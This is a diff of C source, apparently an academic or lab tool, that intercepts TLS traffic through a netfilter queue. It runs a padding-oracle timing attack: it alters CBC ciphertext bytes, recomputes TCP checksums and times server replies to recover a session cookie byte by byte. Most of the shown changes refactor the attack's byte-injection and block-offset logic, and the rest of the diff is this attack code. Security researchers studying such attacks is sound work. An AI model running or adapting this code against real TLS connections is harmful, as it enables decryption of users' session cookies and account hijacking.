@@ -346,72 +346,6 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
         data_packet->data = (Byte *)(data_packet->packet + iphdr_size + tcphdr_size);
         data_packet->data_len = application_payload_size;
 
-        
-        /* modifiche da fare: data_packet va allocato una sola volta all'inizio del programma, successivamente viene solamente sovrascritto il contenuto*/
-        // da data packet ho lasciato solamente allocazione di memoria del pacchetto ed i vari componenti puntano all'inizio della loro parte
-        /*
-
-      
-        if(data_packet->packet != NULL){
-          free(data_packet->packet);
-          data_packet->packet = NULL;
-        }
-
-        if(data_packet->ip_header != NULL){
-          free(data_packet->ip_header);
-          data_packet->ip_header = NULL;
-        }
-
-        if(data_packet->tcp_header != NULL){
-          free(data_packet->tcp_header);
-          data_packet->tcp_header = NULL;
-        }
-
-        if(data_packet->data != NULL){
-          free(data_packet->data);
-          data_packet->data = NULL;
-        }
-
-        //allocate memory for the packet
-        data_packet->packet = (unsigned char *)malloc(payload_len * sizeof(unsigned char));
-        if(!data_packet->packet){
-          perror("Error allocating memory for data_packet->packet! \n");
-          exit(EXIT_FAILURE);
-        }
-        memcpy(data_packet->packet, payload, payload_len);
-        data_packet->len = payload_len;//i need to pass the entire packet to calculate the new checksum
-        
-        //allocate memory for the ip_header
-        data_packet->ip_header = (struct iphdr *)malloc(iphdr_size);
-        if(!data_packet->ip_header){
-          perror("Error allocating memory for data_packet->ip_header! \n");
-          exit(EXIT_FAILURE);
-        }
-        memcpy(data_packet->ip_header, ip_header, iphdr_size);
-        data_packet->ip_header_len = iphdr_size;
-
-        //allocate memory for the tcp_header
-        data_packet->tcp_header = (struct tcphdr *)malloc(tcphdr_size);
-        if(!data_packet->tcp_header){
-          perror("Error allocating memory for data_packet->tcp_header! \n");
-          exit(EXIT_FAILURE);
-        }
-        memcpy(data_packet->tcp_header, tcp_header, tcphdr_size);
-        data_packet->tcp_header_len = tcphdr_size;
-
-        //allocate memory for the application data
-        data_packet->data = (unsigned char *)malloc(application_payload_size * sizeof(unsigned char));
-        if(!data_packet->data){
-          perror("Error allocating memory for data_packet->data! \n");
-          exit(EXIT_FAILURE);
-        }
-        memcpy(data_packet->data, application_payload, application_payload_size);
-        data_packet->data_len = application_payload_size; */
-
-        
-
-
-
         attack = true;
         pthread_cond_signal(&attack_thread_cond);
         pthread_mutex_unlock(&attack_thread_mutex);
@@ -504,12 +438,9 @@ static bool is_tls_data(const Byte *payload, unsigned int application_payload_le
 
 void modify_packet(bool first_modification){
 
-  //l'hardcoded del blocco va poi regolato in base alla dimensione dei dati (se 42 byte o se multiplo di 42 byte) 
-
+  int block_pos = (data_packet->data_len - 5 - BLOCK_DIM) / BLOCK_DIM;
+  block_pos -= 1;
   if(first_modification){
-
-    int block_pos = (data_packet->data_len - 5 - 16) / 16;
-    block_pos -= 1;
     modify_last_bytes(data_packet, block_pos, val_penultimate_byte, val_last_byte);
     if(val_last_byte == 0xFF){
       val_last_byte = 0x00;
@@ -517,13 +448,13 @@ void modify_packet(bool first_modification){
     }else{
       val_last_byte = (val_last_byte + 1) % 0x100;
     }
-  }else{ //per entrare in questo ramo di codice devo mettere first attack a false
-    Byte original_c15 = data_packet->data[5 + ((4-1) * 16) + 15];
+  }else{ //to enter in this branch first_attack must be false
+    Byte original_c15 = data_packet->data[5 + ((4-1) * BLOCK_DIM) + 15];
     Byte known_plain = cookie[cookie_index-1];
     Byte expected_padding = 0x01;
 
-    data_packet->data[5 + ((4-1) * 16) + 15] = original_c15 ^ known_plain ^ expected_padding;
-    data_packet->data[5 + ((4-1) * 16 ) + 14] = single_byte; 
+    data_packet->data[5 + (block_pos * BLOCK_DIM) + (BLOCK_DIM -1)] = original_c15 ^ known_plain ^ expected_padding;
+    data_packet->data[5 + (block_pos * BLOCK_DIM ) + (BLOCK_DIM -2)] = single_byte; 
     if(single_byte == 0xFF){
       single_byte = 0x00;
     }else{
@@ -547,7 +478,6 @@ int update_tls_record_for_truncation(Byte *application_payload, unsigned int *ap
 
   return diff;
 }
-
 
 //function to recalculate the TCP checksum (provare dopo a spostarla in utility.c passando come paramento const Data_packet **)
 unsigned short recalculate_checksum(){
@@ -657,7 +587,6 @@ void send_modified_packet(uint64_t *start){
 //thread function to perform attack
 void *do_attack_thread(void *arg){
 
-  struct timespec start;
   char *server_interface = get_server_interface(ip_server, port_server);
   bool first_attack = true;
   unsigned long long n_attemps = 0;
@@ -692,26 +621,9 @@ void *do_attack_thread(void *arg){
       allocate_packet(data_packet, original_packet);
       allocated = true;
     }
-    
-    //printf("Secondo thread avviato\n");
-    /*
-    printf("------Packet------ \n");
-    print_application_data(data_packet->data, data_packet->data_len); */
 
     clone_packet(data_packet, original_packet);
-
-    //printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
-    //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
-    //print_data_blocks(data_packet->data, data_packet->data_len);
-    
-    //se si tratta di prima modifica, provare in coppia i 2 byte
-    //se si tratta di modifica successiva alla prima, impostare il valore dell'ultimo byte in modo tale da inettare 0x01 come padding e modificare il penultimo byte
-    //in modo da provare tutti i valori possibili 
     modify_packet(first_attack);
-
-    //printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
-    //print_data_blocks(data_packet->data, data_packet->data_len);
-    //printf("Recalculate checksum! \n");
 
     data_packet->tcp_header->check = recalculate_checksum();
 
@@ -732,10 +644,7 @@ void *do_attack_thread(void *arg){
     }
 
     long long delta = stop_cycles - start_cycles;
-
     printf("Reply delta time: %llu \n", delta);
-
-    //write the reply time inside the struct
 
     int column, row;
    
@@ -779,11 +688,9 @@ void *do_attack_thread(void *arg){
           so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
           per ottenere 0x01 0x01 so che i byte che devo iniettare sono
         */
-       
         
         Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
         Byte expected_penultimate_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; 
-        
 
         /*
         Byte expected_last_byte = 0x39;
